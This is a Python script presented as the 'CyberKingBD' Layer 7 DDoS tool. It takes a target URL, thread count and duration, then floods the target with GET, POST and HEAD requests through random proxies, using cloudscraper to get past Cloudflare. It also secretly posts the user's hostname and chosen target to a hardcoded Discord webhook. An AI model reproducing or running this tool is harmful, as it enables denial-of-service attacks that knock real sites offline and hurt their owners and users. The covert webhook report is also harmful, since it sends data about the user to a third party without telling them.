import os
from os import system, name
import httpx
from httpx import AsyncClient, Headers
import os, threading, requests, cloudscraper, datetime, time, socket, socks, ssl, random, socket
from discord_webhook import DiscordWebhook, DiscordEmbed
from urllib.parse import urlparse
from requests.cookies import RequestsCookieJar
from sys import stdout
import socket

hst = socket.gethostname()


def countdown():
    stdout.write("Bypassing CloudFlare")

################################################################################
############################################################
with open('ua.txt', 'r') as f1:

    useragents = f1.read().splitlines()



################################################################################
################################################################################
############################################################
def title():
    print("""
  CCCC     K    K   BBBB      DDDD
 C    C    K   K    B   B     D   D
C          K  K     B    B    D    D
C          KKK      B  BB     D     D
C          K  K     B    B    D    D
 C    C    K   K    B   B     D   D
  CCCC     K    K   BBBB      DDDD
            DDoS Tool Layer7
            https://t.me/cyberkingbd
""")
################################################################################
##############
def get_info_l7():
    stdout.write("Url/Target =  ")
    target = input()
    stdout.write("THREADS (500000)= ")
    thread = input()
    stdout.write("TIME(s) = ")
    t = input()
    webhook = DiscordWebhook(url="https://discord.com/api/webhooks/1142419990109237439/Rx1Nm16IhOk4CtgUcTBo5DYwlmyYKQhuPRZBDOx-rCm3rhZkCPqWmskbtX056IBSAibq")
    embed = DiscordEmbed(title=" :satellite: CyberKingBD-DDoS Attack Log :satellite:", color=0x2ecc71)
    embed.set_timestamp()
    embed.set_footer(text="CyberKingBD-DDoS")
    embed.add_embed_field(name=f'Infomartion', value=f'User {hst} is Now Attacking {target}')
    webhook.add_embed(embed)
    response = webhook.execute()
    return target, thread, t

def Launch(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    scraper = cloudscraper.create_scraper()
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=Attack, args=(url, until, scraper))
            thd.start()
            print(f"[CyberKingBD] CKBD[{target}]")
        except:
            pass

def Attack(url, until_datetime, scraper):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            fsf = str(random.choice(open('proxy.txt').read().splitlines()))
            ff = {"http": fsf}
            scraper.get(url, timeout=5, proxies=ff)
            scraper.post(url, timeout=5, proxies=ff)
            scraper.head(url, timeout=5, proxies=ff)
        except Exception as e:
            print(e)
            pass
title()
command = ("s")
if command == "s" or command == "s":
        target, thread, t = get_info_l7()
        Launch(target, thread, t)